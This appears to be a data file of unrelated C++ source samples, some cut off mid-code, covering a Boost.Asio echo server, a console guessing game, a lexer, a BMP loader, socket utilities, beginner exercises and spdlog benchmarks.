    "//\n// Created by whx on 24-10-28.\n//\n\n#include \"../include/CServer.hpp\"\n#include \"../include/CSession.hpp\"\n\nvoid CSession::Start() {\n    memset(_data, 0, max_length);\n    _socket.async_read_some(boost::asio::buffer(_data, max_length),\n        [this] <typename T0, typename T1>\n            (T0 && PH1, T1 && PH2) {\n                handle_read(std::forward<T0>(PH1), std::forward<T1>(PH2), shared_from_this());\n            });\n}\n\nvoid CSession::Send(char *msg, int max_length) {\n    std::lock_guard lock(_send_lock);\n    const unsigned long send_size = _send_que.size();\n    if(_send_que.size() > 50) {\n        std::cout << \"too much \" << '\\n';\n        return;\n    }\n\n    _send_que.push(std::make_shared<MsgNode>(msg, max_length));\n    if(send_size > 0) {\n        return;\n    }\n\n    const auto& msgNode = _send_que.front();\n    // ReSharper disable once CppRedundantQualifier\n    boost::asio::async_write(_socket, boost::asio::buffer(msgNode->_data, msgNode->_total_len),\n            [this]<typename T0, typename T1>\n                (T0&& PH1, T1&&) {\n            handle_write(std::forward<T0>(PH1), shared_from_this());\n        });\n}\n\nvoid CSession::handle_read(const boost::system::error_code &error,\n        std::size_t bytes_transferred, const std::shared_ptr<CSession>& _self_shared) {\n    if(!error) {\n        int copy_len = 0;\n        while (bytes_transferred > 0) {\n            if(!_head_parse) {\n                // when length smaller than head\n                if(bytes_transferred + _recv_head_node->_cur_len < HEAD_LENGTH) {\n                    memcpy(_recv_head_node->_data + _recv_head_node->_cur_len, _data + copy_len, bytes_transferred);\n                    _recv_head_node->_cur_len += static_cast<int>(bytes_transferred);\n\n                    memset(_data, 0, max_length);\n                    _socket.async_read_some(boost::asio::buffer(_data, max_length),\n                    [this, _self_shared] <typename T0, typename T1>\n                        (T0 && PH1, T1 && PH2){\n                        handle_read(std::forward<T0>(PH1), std::forward<T1>(PH2), _self_shared);\n                    });\n                    return;\n                }\n\n                // \u6536\u96c6\u5230\u7684\u6570\u636e\u6bd4\u5934\u90e8\u591a\n                int head_remain = HEAD_LENGTH - _recv_head_node->_cur_len;\n                memcpy(_recv_head_node->_data + _recv_head_node->_cur_len, _data + copy_len, head_remain);\n\n                copy_len += head_remain;\n                bytes_transferred -= head_remain;\n\n                short data_len = 0;\n                memcpy(&data_len, _recv_head_node->_data, HEAD_LENGTH);\n                data_len = static_cast<short>(boost::asio::detail::socket_ops::network_to_host_short(data_len));\n                std::cout << \"data length is: \" << data_len << std::endl;\n\n                if(data_len > max_length) {\n                    std::cout << \"invaild data length is: \" << data_len << std::endl;\n                    _server->clear_session(_uuid);\n                    return;\n                }\n                _recv_msg_node = std::make_shared<MsgNode>(data_len);\n\n                // \u6d88\u606f\u672a\u6536\u96c6\u5168\n                if(bytes_transferred < data_len) {\n                    memcpy(_recv_msg_node->_data + _recv_msg_node->_cur_len, _data + copy_len, bytes_transferred);\n                    _recv_msg_node->_cur_len += static_cast<int>(bytes_transferred);\n\n                    memset(_data, 0, max_length);\n                    _socket.async_read_some(boost::asio::buffer(_data, max_length),\n                    [this, _self_shared] <typename T0, typename T1>\n                            (T0 && PH1, T1 && PH2){\n                        handle_read(std::forward<T0>(PH1), std::forward<T1>(PH2), _self_shared);\n                    });\n\n                    _head_parse = true;\n                    return;\n                }\n\n                // \u6536\u96c6\u5b8c\u6570\u636e\n                memcpy(_recv_msg_node->_data + _recv_msg_node->_cur_len, _data + copy_len, data_len);\n\n                _recv_msg_node->_cur_len += data_len;\n                copy_len += data_len;\n                bytes_transferred -= data_len;\n                _recv_msg_node->_data[_recv_msg_node->_total_len] = '\\0';\n\n                std::cout << \"receive data is: \" << _recv_msg_node->_data << std::endl;\n                Send(_recv_msg_node->_data, _recv_msg_node->_total_len);\n\n                // \u5207\u5305\n                _head_parse = false;\n                _recv_head_node->Clear();\n\n                if(bytes_transferred <= 0) {\n                    memset(_data, 0, max_length);\n                    _socket.async_read_some(boost::asio::buffer(_data, max_length),\n                    [this, _self_shared] <typename T0, typename T1>\n                            (T0 && PH1, T1 && PH2){\n                        handle_read(std::forward<T0>(PH1), std::forward<T1>(PH2), _self_shared);\n                    });\n                    return;\n                }\n                continue;\n            }\n\n            // \u5934\u90e8\u5904\u7406\u5b8c\u4e86\n            int remain_msg = _recv_msg_node->_total_len - _recv_msg_n",
    "#include <iostream>\n#include <Windows.h>\n#include <chrono>\n#include <thread>\n#include \"GuessTheNumber.h\"\n\nint main()\n{\n\tInitialConfiguration();\n\n\twhile (true) {\n\t\tShowStartScreen();\n\n\t\tPlayGameLoop();\n\n\t\tShowEndScreen();\n\t}\n}\n\nvoid InitialConfiguration()\n{\n\tSetConsoleOutputCP(CP_UTF8);\n}\n\nvoid PlayGameLoop()\n{\n\tint guesses = 1;\n\tint guess;\n\n\tint sortedNumber = GetRandomNumber();\n\n\twhile (true) {\n\n\t\tguesses++;\n\n\t\tPlayBeep();\n\t\tstd::cout << \"Tentativa: \";\n\t\tstd::cin >> guess;\n\n\t\tsystem(\"cls\");\n\t\tPlayBeep();\n\n\t\tif (guess == sortedNumber) {\n\t\t\tbreak;\n\t\t}\n\t\telse if (guess < sortedNumber)\n\t\t\tstd::cout << \"O numero \u00e9 maior que \" << guess << \"!\" << std::endl;\n\t\telse\n\t\t\tstd::cout << \"O numero \u00e9 menor que \" << guess << \"!\" << std::endl;\n\t}\n\n\tsystem(\"cls\");\n\n\tstd::cout << \"Voc\u00ea adivinhou!!! O numero era \" << sortedNumber << \"!!\" << std::endl;\n\tstd::cout << \"Foram \" << guesses << \" tentativas.\" << std::endl;\n}\n\nvoid ShowStartScreen()\n{\n\tstd::cout << \"====== GUESS THE NUMBER ==========\" << std::endl;\n\tstd::cout << \"Tente advinhar o numero sorteado de 1 a 100 em menos tentativas conseguir.\" << std::endl;\n\tstd::cout << \"Calma, a cada tentativa mostrara se o numero \u00e9 maior ou menor que o seu palpite.\" << std::endl;\n\tstd::cout << \"Quando estiver pronto, pressione ENTER!\" << std::endl;\n\tstd::cin.get();\n\tPlayBeep();\n\n\tsystem(\"cls\");\n\n\tstd::cout << \"Boa sorte!\" << std::endl;\n\tPlayBeep();\n\n\tWaitASecond();\n\n\tsystem(\"cls\");\n\n\tWaitASecond();\n}\n\nvoid ShowEndScreen()\n{\n\tstd::cout << \"=====Pressione ENTER para voltar a tela inicial=======\" << std::endl;\n\tstd::cin.ignore(1, '\\n');\n\tstd::cin.get();\n\tPlayBeep();\n\tsystem(\"cls\");\n}\n\nvoid WaitASecond()\n{\n\tstd::this_thread::sleep_for(std::chrono::seconds(1));\n}\n\nint GetRandomNumber()\n{\n\tunsigned int seed = time(0);\n\tsrand(seed);\n\treturn rand() % 100;\n}\n\nvoid PlayBeep()\n{\n\tBeep(750, 200);\n}\n\n",
    "#include \"Scanner.h\"\n\n#include <string>\nusing namespace std;\n\nstring Scanner::toString(TokenType t)\n{\n\tif (t == NONE)\n\t\treturn \"NONE\";\n\tif (t == PLUS)\n\t\treturn \"PLUS\";\n\tif (t == MINUS)\n\t\treturn \"MINUS\";\n\tif (t == EQUALASSIGN)\n\t\treturn \"EQL\";\n\tif (t == LPAREN)\n\t\treturn \"LPAREN\";\n\tif (t == RPAREN)\n\t\treturn \"RPAREN\";\n\tif (t == LBRACE)\n\t\treturn \"LBRACE\";\n\tif (t == RBRACE)\n\t\treturn \"RBRACE\";\n\tif (t == FLOAT)\n\t\treturn \"FLOAT\";\n\tif (t == EE)\n\t\treturn \"EE\";\n\tif (t == GR)\n\t\treturn \"GR\";\n\tif (t == LS)\n\t{\n\t\treturn \"LS\";\n\t}\n\tif (t == GRE)\n\t\treturn \"GRE\";\n\tif (t == MULTIPLY)\n\t\treturn \"MULTIPLY\";\n\tif (t == DIVIDE)\n\t\treturn \"DIVIDE\";\n\tif (t == MOD)\n\t\treturn \"MOD\";\n\tif (t == COMMA)\n\t\treturn \"COMMA\";\n\tif (t == NOT)\n\t\treturn \"NOT\";\n\tif (t == AND)\n\t\treturn \"AND\";\n\tif (t == OR)\n\t\treturn \"OR\";\n\tif (t == STRING)\n\t\treturn \"STRING\";\n\tif (t == SEMI)\n\t\treturn \"SEMI\";\n\tif (t == ERROR)\n\t\treturn \"error: \";\n\tif (t == ENDOFFILE)\n\t\treturn \"eof: \";\n\treturn \"ERROR in tostring\";\n}\n\nstring Scanner::currentTokenString()\n{\n\treturn currents;\n}\n\nstring Scanner::nextTokenString()\n{\n\treturn nexts;\n}\n\nTokenType Scanner::currentTokenType()\n{\n\treturn currenttt;\n}\n\nTokenType Scanner::nextTokenType()\n{\n\treturn nexttt;\n}\n\nvoid Scanner::currentStatus()\n{\n\tcout << \"CTT: \" << toString(currentTokenType()) << \"\\n\";\n\tcout << \"CTS: \" << currentTokenString() << \"\\n\";\n\tcout << \"NTT: \" << toString(nextTokenType()) << \"\\n\";\n\tcout << \"NTS: \" << nextTokenString() << \"\\n\";\n}\n\nScanner::Scanner(string fname)\n{\n\tfilestream.open(fname);\n\n\tlinenext = 1;\n\n\t\n\n\tif (!filestream.good())\n\t{\n\t\tcout << \"Could not open file: \"<< fname<<\"\\n\";\n\t\treturn;\n\t}\n\n\t\n\tadvance(); //fill up first slot\n\tadvance(); //fill up second slot\n\n\t/*while (currentTokenType() != ENDOFFILE)\n\t{\n\t\tcout << toString(currentTokenType()) << \" \" << currentTokenString() << \"\\n\";\n\t\tadvance();\n\t}*/\n}\n\n\nvoid addToBuffer(string & buf, ifstream & stream)\n{\n\tint next = stream.get();\n\n\tif (next == -1)\n\t{\n\t\tbuf = buf + (char)0; //null signifies eof for today!\n\t}\n\telse\n\t{\n\t\tbuf = buf + (char)next;\n\t}\n\n}\n\n\nvoid removeFromBuffer(string & buf, ifstream & stream)\n{\n\tchar last = buf.back();\n\tstream.putback(last);\n\tbuf = buf.substr(0, buf.size() - 1);\n\t\n}\n\n\nbool isNum(char test)\n{\n\treturn (test == '0' || test == '1' || test == '2' || test == '3' || test == '4' || test == '5' || test == '6' || test == '7' || test == '8' || test == '9');\n}\n\nbool isLowerCharacter(char test)\n{\n\treturn (test == 'a' || test == 'b' || test == 'c' || test == 'd' ||\n\t\ttest == 'e' || test == 'f' || test == 'g' || test == 'h' ||\n\t\ttest == 'i' || test == 'j' || test == 'k' || test == 'l' ||\n\t\ttest == 'm' || test == 'n' || test == 'o' || test == 'p' ||\n\t\ttest == 'q' || test == 'r' || test == 's' || test == 't' ||\n\t\ttest == 'u' || test == 'v' || test == 'w' || test == 'x' || test == 'y' || test == 'z' || test == '_');\n}\n\nbool isUpperCharacter(char test)\n{\n\treturn (test == 'A' || test == 'B' || test == 'C' || test == 'D' ||\n\t\ttest == 'E' || test == 'F' || test == 'G' || test == 'H' ||\n\t\ttest == 'I' || test == 'J' || test == 'K' || test == 'L' ||\n\t\ttest == 'M' || test == 'N' || test == 'O' || test == 'P' ||\n\t\ttest == 'Q' || test == 'R' || test == 'S' || test == 'T' ||\n\t\ttest == 'U' || test == 'V' || test == 'W' || test == 'X' || test == 'Y' || test == 'Z');\n}\n\nbool isWhiteSpace(char test)\n{\n\treturn (test == ' ' || test == '\\t' || test == '\\n');\n}\n\n\n\n\n//advance places whatever is in the next variables into the current variables and finds what the next variables are supposed to be\nvoid Scanner::advance()\n{\n\tcurrents = nexts;\n\tcurrenttt = nexttt;\n\tlinecurrent = linenext;\n\n\n\t//set that the scanner has not picked something yet. We will use this later on.\n\tnexttt = NONE;\n\n\t//holds what is currently read in but not yet processed\n\tstring buffer;\n\n\tbool start = true;\n\twhile (start)\n\t{\n\t\tstart = false;\n\n\t\tbuffer = \"\";\n\n\t\t//add the first thing to the buffer\n\t\taddToBuffer(buffer, filestream);\n\n\t\t\n\t\t//if the first thing is a {, then say we have an LBrace and set the string representation of it to \"{\"\n\t\tif (buffer[0] == '{')\n\t\t{\n\t\t\tnexttt = LBRACE;\n\t\t\tnexts = \"{\";\n\t\t}\n\t\telse if (buffer[0] == '}')\n\t\t{\n\t\t\tnexttt = RBRACE;\n\t\t\tnexts = \"}\";\n\t\t}\n\t\telse if (buffer[0] == '%')\n\t\t{\n\t\t\tnexttt = MOD;\n\t\t\tnexts = \"%\";\n\t\t}\n\t\telse if (buffer[0] == '(')\n\t\t{\n\t\t\tnexttt = LPAREN;\n\t\t\tnexts = \"(\";\n\t\t}\n\t\telse if (buffer[0] == ')')\n\t\t{\n\t\t\tnexttt = RPAREN;\n\t\t\tnexts = \")\";\n\t\t}\n\t\telse if (buffer[0] == '+')\n\t\t{\n\t\t\tnexttt = PLUS;\n\t\t\tnexts = \"+\";\n\t\t}\n\t\telse if (buffer[0] == '&')\n\t\t{\n\t\t\tnexttt = AND;\n\t\t\tnexts = \"&\";\n\t\t}\n\t\telse if (buffer[0] == '|')\n\t\t{\n\t\t\tnexttt = OR;\n\t\t\tnexts = \"|\";\n\t\t}\n\t\telse if (buffer[0] == '/')\n\t\t{\n\t\t\tnexttt = DIVIDE;\n\t\t\tnexts = \"/\";\n\t\t}\n\t\telse if (buffer[0] == '*')\n\t\t{\n\t\t\tnexttt = MULTIPLY;\n\t\t\tnexts = \"*\";\n\t\t}\n\t\telse if (buffer[0] == '!')\n\t\t{\n\t\t\tnexttt = NOT;\n\t\t\tnexts = \"!\";\n\t\t}\n\t\telse if (buffer[0] == ',')\n\t\t{\n\t\t\tnexttt = COMMA;\n\t\t\tnexts = \",\";\n\t\t}\n\t\telse if (buffer[0] == '=')\n\t\t{\n\t\t\t//this one is harder because you have to determine if you have an = or if you have ==\n\n\t\t\taddToBuff",
    "\ufeff#include <iostream>\nusing namespace std;\n\nbool loadBMP_custom(const char* imagepath, int& width, int& height, unsigned char* &data) {\n\n\tcout << \"Reading image \" << imagepath<<endl;\n\n\t// Data read from the header of the BMP file\n\tunsigned char header[54];\n\tunsigned int dataPos;\n\tunsigned int imageSize;\n\t// Actual RGB data\n\n\t// Open the file\n\tFILE* file = fopen(imagepath, \"rb\");\n\tif (!file) {\n\t\tcout << imagepath << \"could not be opened.Are you in the right directory ?\";\n\t\treturn false;\n\t}\n\n\t// Read the header, i.e. the 54 first bytes\n\t// If less than 54 bytes are read, problem\n\tif (fread(header, 1, 54, file) != 54) {\n\t\tcout <<\"Not a correct BMP file\"<<endl;\n\t\tfclose(file);\n\t\treturn false;\n\t}\n\t// A BMP files always begins with \"BM\"\n\tif (header[0] != 'B' || header[1] != 'M') {\n\t\tcout<< \"Not a correct BMP file\"<<endl;\n\t\tfclose(file);\n\t\treturn false;\n\t}\n\t// Make sure this is a 24bpp file\n\tif (*(int*)&(header[0x1E]) != 0) {cout << \"Not a correct BMP file\" << endl;  fclose(file); return 0; }\n\tif (*(int*)&(header[0x1C]) != 24) {cout << \"Not a correct BMP file\" << endl;    fclose(file); return 0; }\n\n\t// Read the information about the image\n\tdataPos = *(int*)&(header[0x0A]);\n\timageSize = *(int*)&(header[0x22]);\n\twidth = *(int*)&(header[0x12]);\n\theight = *(int*)&(header[0x16]);\n\n\t// Some BMP files are misformatted, guess missing information\n\tif (imageSize == 0)    imageSize = width * height * 3; // 3 : one byte for each Red, Green and Blue component\n\tif (dataPos == 0)      dataPos = 54; // The BMP header is done that way\n\n\t// Create a buffer\n\tdata = new unsigned char[imageSize];\n\n\t// Read the actual data from the file into the buffer\n\tfseek(file, dataPos, SEEK_SET);\n\tfread(data, 1, imageSize, file);\n\n\t// Everything is in memory now, the file can be closed.\n\tfclose(file);\n\treturn true;\n}",
    "\ufeff// Copyright (c) 2024 The nethello project authors. SPDX-License-Identifier: MIT.\n// This file is part of nethello(https://github.com/wichue/nethello).\n\n#include <fcntl.h>\n#include <assert.h>\n#include <cstdio>\n#include <cstring>\n#include <mutex>\n#include <string>\n#include <unordered_map>\n#include \"SocketBase.h\"\n#include \"util.h\"\n#include \"Logger.h\"\n#include \"uv_errno.h\"\n#include \"onceToken.h\"\n#if defined (__APPLE__)\n#include <ifaddrs.h>\n#include <netinet/tcp.h>\n#endif\n\nusing namespace std;\n\nnamespace chw {\n\n#if defined(_WIN32)\nstatic onceToken g_token([]() {\n    WORD wVersionRequested = MAKEWORD(2, 2);\n    WSADATA wsaData;\n    WSAStartup(wVersionRequested, &wsaData);\n}, []() {\n    WSACleanup();\n});\nint ioctl(int fd, long cmd, u_long *ptr) {\n    return ioctlsocket(fd, cmd, ptr);\n}\nint close(int fd) {\n    return closesocket(fd);\n}\n#if (_WIN32_WINNT < _WIN32_WINNT_VISTA)\nconst char *inet_ntop(int af, const void *src, char *dst, socklen_t size) {\n    struct sockaddr_storage ss;\n    unsigned long s = size;\n\n    ZeroMemory(&ss, sizeof(ss));\n    ss.ss_family = af;\n\n    switch (af) {\n    case AF_INET:\n        ((struct sockaddr_in *)&ss)->sin_addr = *(struct in_addr *)src;\n        break;\n    case AF_INET6:\n        ((struct sockaddr_in6 *)&ss)->sin6_addr = *(struct in6_addr *)src;\n        break;\n    default:\n        return NULL;\n    }\n    /* cannot direclty use &size because of strict aliasing rules */\n    return (WSAAddressToString((struct sockaddr *)&ss, sizeof(ss), NULL, dst, &s) == 0) ? dst : NULL;\n}\nint inet_pton(int af, const char *src, void *dst) {\n    struct sockaddr_storage ss;\n    int size = sizeof(ss);\n    char src_copy[INET6_ADDRSTRLEN + 1];\n\n    ZeroMemory(&ss, sizeof(ss));\n    /* stupid non-const API */\n    strncpy(src_copy, src, INET6_ADDRSTRLEN + 1);\n    src_copy[INET6_ADDRSTRLEN] = 0;\n\n    if (WSAStringToAddress(src_copy, af, NULL, (struct sockaddr *)&ss, &size) == 0) {\n        switch (af) {\n        case AF_INET:\n            *(struct in_addr *)dst = ((struct sockaddr_in *)&ss)->sin_addr;\n            return 1;\n        case AF_INET6:\n            *(struct in6_addr *)dst = ((struct sockaddr_in6 *)&ss)->sin6_addr;\n            return 1;\n        }\n    }\n    return 0;\n}\n#endif\n#endif // defined(_WIN32)\n\nstatic inline string my_inet_ntop(int af, const void *addr) {\n    string ret;\n    ret.resize(128);\n    if (!inet_ntop(af, const_cast<void*>(addr), (char *) ret.data(), ret.size())) {\n        ret.clear();\n    } else {\n        ret.resize(strlen(ret.data()));\n    }\n    return ret;\n}\n\nstatic inline bool support_ipv6_l() {\n    auto fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);\n    if (fd == -1) {\n        return false;\n    }\n    close(fd);\n    return true;\n}\n\nbool SockUtil::support_ipv6() {\n    static auto flag = support_ipv6_l();\n    return flag;\n}\n\nstring SockUtil::inet_ntoa(const struct in_addr &addr) {\n    return my_inet_ntop(AF_INET, &addr);\n}\n\nstd::string SockUtil::inet_ntoa(const struct in6_addr &addr) {\n    return my_inet_ntop(AF_INET6, &addr);\n}\n\nstd::string SockUtil::inet_ntoa(const struct sockaddr *addr) {\n    switch (addr->sa_family) {\n        case AF_INET: return SockUtil::inet_ntoa(((struct sockaddr_in *)addr)->sin_addr);\n        case AF_INET6: {\n            if (IN6_IS_ADDR_V4MAPPED(&((struct sockaddr_in6 *)addr)->sin6_addr)) {\n                struct in_addr addr4;\n                memcpy(&addr4, 12 + (char *)&(((struct sockaddr_in6 *)addr)->sin6_addr), 4);\n                return SockUtil::inet_ntoa(addr4);\n            }\n            return SockUtil::inet_ntoa(((struct sockaddr_in6 *)addr)->sin6_addr);\n        }\n        default: return \"\";\n    }\n}\n\nuint16_t SockUtil::inet_port(const struct sockaddr *addr) {\n    switch (addr->sa_family) {\n        case AF_INET: return ntohs(((struct sockaddr_in *)addr)->sin_port);\n        case AF_INET6: return ntohs(((struct sockaddr_in6 *)addr)->sin6_port);\n        default: return 0;\n    }\n}\n\nint SockUtil::setCloseWait(int fd, int second) {\n    linger m_sLinger;\n    //\u5728\u8c03\u7528closesocket()\u65f6\u8fd8\u6709\u6570\u636e\u672a\u53d1\u9001\u5b8c\uff0c\u5141\u8bb8\u7b49\u5f85  [AUTO-TRANSLATED:8744ea4d]\n    //Allow waiting when calling closesocket() with data still to be sent\n    // \u82e5m_sLinger.l_onoff=0;\u5219\u8c03\u7528closesocket()\u540e\u5f3a\u5236\u5173\u95ed  [AUTO-TRANSLATED:07e5d642]\n    //Force close after calling closesocket() if m_sLinger.l_onoff = 0\n    m_sLinger.l_onoff = (second > 0);\n    m_sLinger.l_linger = second; //\u8bbe\u7f6e\u7b49\u5f85\u65f6\u95f4\u4e3ax\u79d2\n    int ret = setsockopt(fd, SOL_SOCKET, SO_LINGER, (char *) &m_sLinger, sizeof(linger));\n    if (ret == -1) {\n#ifndef _WIN32\n        TraceL << \"setsockopt SO_LINGER failed\";\n#endif\n    }\n    return ret;\n}\n\nint SockUtil::setNoDelay(int fd, bool on) {\n    int opt = on ? 1 : 0;\n    int ret = setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (char *) &opt, static_cast<socklen_t>(sizeof(opt)));\n    if (ret == -1) {\n        TraceL << \"setsockopt TCP_NODELAY failed\";\n    }\n    return ret;\n}\n\nint SockUtil::setReuseable(int fd, bool on, bool reuse_port) {\n    int opt = on ? 1 : 0;\n    int ret = setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (char *) &opt, static_cast<",
    "#include<iostream>\r\n#include<string>\r\nusing namespace std;\r\n\r\n//void test1()\r\n//{\r\n//\tstring s1;\r\n//\ts1 = \"aaa\";\r\n//\tcout << s1 << endl;\r\n//\r\n//\tstring s2(\"bbbb\");\r\n//\tcout << s2 << endl;\r\n//\r\n//\tstring s3=s2;\r\n//\tcout << s3 << endl;\r\n//\r\n//\tstring s4(s3);\r\n//\tcout << s4 << endl;\r\n//\r\n//\tstring s5;\r\n//\tchar s[] = { \"cccc\" };\r\n//\ts5 = s;\r\n//\tcout << s5 << endl;\r\n//\r\n//\tstring s6(s);\r\n//\tcout << s6 << endl;\r\n//\r\n//\tstring s7(\"hello world\");\r\n//\tstring s8(3,'d');\r\n//\tcout << s7 << endl << s8 << endl;\r\n//\r\n//\tstring s9(s7,0,5);\r\n//\tcout << s9;\r\n//}\r\n//\r\n//void test2()\r\n//{\r\n//\tstring s = \"abcde\";\r\n//\tcout << s.size() << ' ' << s.length() << endl;\r\n//\r\n//\tcout << s.capacity() << endl;\r\n//\r\n//\ts.reserve(50);\r\n//\tcout << s.capacity() << endl;\r\n//\ts += \"hijklmnopqargawgrawrg\";\r\n//\tcout << s.capacity() << endl;\r\n//\r\n//\ts.resize(100,'q');\r\n//\tcout << s << endl;\r\n//\r\n//\tstring s2;\r\n//\ts2.resize(5, 'a');\r\n//\tcout << s2 << endl;\r\n//\r\n//\tif (!s.empty())cout << \"NO\" << endl;\r\n//\r\n//\ts.clear();\r\n//\tif (s.empty())cout << \"YES\" << endl;\r\n//\r\n//\r\n//}\r\n/*\r\nvoid test3()\r\n{\r\n\tstring str(\"123456\");\r\n\tcout << str[0] << endl;\r\n\r\n\tchar begin = str[0];\r\n\tcout << begin << endl;\r\n\tcout << *str.begin() << endl;\r\n\tcout << *(str.end()-3) << endl;\r\n\r\n\tfor (auto a: str)\r\n\t{\r\n\t\tcout << a << ' ';\r\n\t}\r\n\r\n\tcout << endl<<strlen(str.c_str()) << endl;\r\n\r\n}\r\n*/\r\n\r\n//void test4()\r\n//{\r\n//\tstring s1(\"ab\");\r\n//\tstring sr(\"abc,de,f,g\");\r\n//\tsize_t s=sr.find(',');\r\n//\r\n//\tsize_t s2 = sr.rfind(',');\r\n//\t//cout << string::npos << endl;\r\n//\tcout << sr[s] <<' '<<s<< endl;\r\n//\r\n//\tstring s3 = sr.substr(1,3);\r\n//\tcout << s3;\r\n//}\r\n\r\nint main()\r\n{\r\n\t//test1();\r\n\t//test3();\r\n\r\n\t//test4();\r\n\treturn 0;\r\n}",
    "#include <iostream>\nusing namespace std;\n\nint main()\n{\n    setlocale(LC_ALL, \"ru\");\n    //1\n    //int x;\n    //cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u043e\u0440\u044f\u0434\u043a\u043e\u0432\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u043c\u0435\u0441\u044f\u0446\u0430: \";\n    //cin >> x;\n    //if (x <= 0 || x > 12)\n    //{\n    //    cout << \"Error\";\n    //}\n    //else if (x <= 2)\n    //{\n    //    cout << \"Winter\";\n    //}\n    //else if (x <= 5 && x > 2 || x == 12)\n    //{\n    //    cout << \"Spring\";\n    //}\n    //else if (x <= 8 && x > 5)\n    //{\n    //    cout << \"Summer\";\n    //}\n    //else if (x <= 11 && x > 8)\n    //{\n    //    cout << \"Autumn\";\n    //}\n\n\n    //2\n    //int x;\n    //int n = x / 10;\n    //cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e: \";\n    //cin >> x;\n    //if (x % 2 == 0)\n    //{\n    //    cout << \u0427\u0438\u0441\u043b\u0435 \u044d \u043f\u0430\u0440\u043d\u044b\u043c\";\n    //}\n    //else if (n * 10 + 3 == x || x == 3)\n    //{\n    //    cout << \"\u0427\u0438\u0441\u043b\u043e \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u043d\u0430 3\";\n    //}\n    //else\n    //{\n    //    cout << \"\u0427\u0438\u0441\u043b\u043e \u043d\u0435 \u043f\u0430\u0440\u043d\u043e\u0435 \u0438 \u043d\u0435 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u043d\u0430 3\";\n    //}\n\n\n    //3\n    int mas[7];\n    int max = 0;\n    for (int i = 0; i < 7; i++)\n    {\n        cout << \"\u0412\u0432\u0435\u0438\u0434\u0435\u0442 \u0447\u0438\u0441\u043b\u043e: \";\n        cin >> mas[i];\n        if (mas[i] > max) max = mas[i];\n    }\n    cout << \"\u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \" << max;\n    \n\n}\n\n",
    "#include \"heads/img.h\"\n#include \"heads/net.h\"\n#include <algorithm>\n#include <cstdio>\n#include <random>\n#include <vector>\nconstexpr int CalcCount = 1000;\nstd::mt19937 rnd(std::random_device{}());\nstd::vector<bool> get(char ch)\n{\n    return Img::getBit(Img::img(ch));\n}\nint main(int, char *argc[])\n{\n    const char *list = \"0123456789+-*/()\";\n    auto gen = Net::read(argc[1]);\n    double ac = 1;\n    double fc = 0;\n    for (int i = 0; i < 16; i++)\n    {\n        double less;\n        double most;\n        less = most = 0;\n        char ch = list[i];\n        double cl;\n        double cm;\n        cl = cm = 0;\n        for (int j = 1; j <= CalcCount; j++)\n        {\n            auto t = gen.generate(get(ch));\n            for (int k = 0; k < 16; k++)\n            {\n                if (i == k)\n                {\n                    cm += most;\n                    most = std::max(most, t[k]);\n                }\n                else\n                {\n                    cl += less;\n                    less = std::max(less, t[k]);\n                }\n            }\n        }\n        cm /= CalcCount;\n        cl /= CalcCount * 15;\n        ac = std::min(ac, most - less);\n        fc += (cm - cl) * (cm - cl);\n        printf(\"%c: for the true, most is %.12lf, less if %.12lf\\n\", ch, most, less);\n    }\n    printf(\"The danger is %.12lf, score is %.12lf\\n\", ac, fc / 16 * 1000);\n    return 0;\n}",
    "//\n// Copyright(c) 2018 Gabi Melman.\n// Distributed under the MIT License (http://opensource.org/licenses/MIT)\n//\n\n//\n// latency.cpp : spdlog latency benchmarks\n//\n\n#include \"benchmark/benchmark.h\"\n\n#include \"spdlog/spdlog.h\"\n#include \"spdlog/async.h\"\n#include \"spdlog/sinks/basic_file_sink.h\"\n#include \"spdlog/sinks/daily_file_sink.h\"\n#include \"spdlog/sinks/null_sink.h\"\n#include \"spdlog/sinks/rotating_file_sink.h\"\n\nvoid bench_c_string(benchmark::State &state, std::shared_ptr<spdlog::logger> logger) {\n    const char *msg =\n        \"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum pharetra metus cursus \"\n        \"lacus placerat congue. Nulla egestas, mauris a tincidunt tempus, enim lectus volutpat mi, \"\n        \"eu consequat sem \"\n        \"libero nec massa. In dapibus ipsum a diam rhoncus gravida. Etiam non dapibus eros. Donec \"\n        \"fringilla dui sed \"\n        \"augue pretium, nec scelerisque est maximus. Nullam convallis, sem nec blandit maximus, \"\n        \"nisi turpis ornare \"\n        \"nisl, sit amet volutpat neque massa eu odio. Maecenas malesuada quam ex, posuere congue \"\n        \"nibh turpis duis.\";\n\n    for (auto _ : state) {\n        logger->info(msg);\n    }\n}\n\nvoid bench_logger(benchmark::State &state, std::shared_ptr<spdlog::logger> logger) {\n    int i = 0;\n    for (auto _ : state) {\n        logger->info(\"Hello logger: msg number {}...............\", ++i);\n    }\n}\nvoid bench_global_logger(benchmark::State &state, std::shared_ptr<spdlog::logger> logger) {\n    spdlog::set_default_logger(std::move(logger));\n    int i = 0;\n    for (auto _ : state) {\n        spdlog::info(\"Hello logger: msg number {}...............\", ++i);\n    }\n}\n\nvoid bench_disabled_macro(benchmark::State &state, std::shared_ptr<spdlog::logger> logger) {\n    int i = 0;\n    benchmark::DoNotOptimize(i);       // prevent unused warnings\n    benchmark::DoNotOptimize(logger);  // prevent unused warnings\n    for (auto _ : state) {\n        SPDLOG_LOGGER_DEBUG(logger, \"Hello logger: msg number {}...............\", i++);\n    }\n}\n\nvoid bench_disabled_macro_global_logger(benchmark::State &state,\n                                        std::shared_ptr<spdlog::logger> logger) {\n    spdlog::set_default_logger(std::move(logger));\n    int i = 0;\n    benchmark::DoNotOptimize(i);       // prevent unused warnings\n    benchmark::DoNotOptimize(logger);  // prevent unused warnings\n    for (auto _ : state) {\n        SPDLOG_DEBUG(\"Hello logger: msg number {}...............\", i++);\n    }\n}\n\n#ifdef __linux__\nvoid bench_dev_null() {\n    auto dev_null_st = spdlog::basic_logger_st(\"/dev/null_st\", \"/dev/null\");\n    benchmark::RegisterBenchmark(\"/dev/null_st\", bench_logger, std::move(dev_null_st))\n        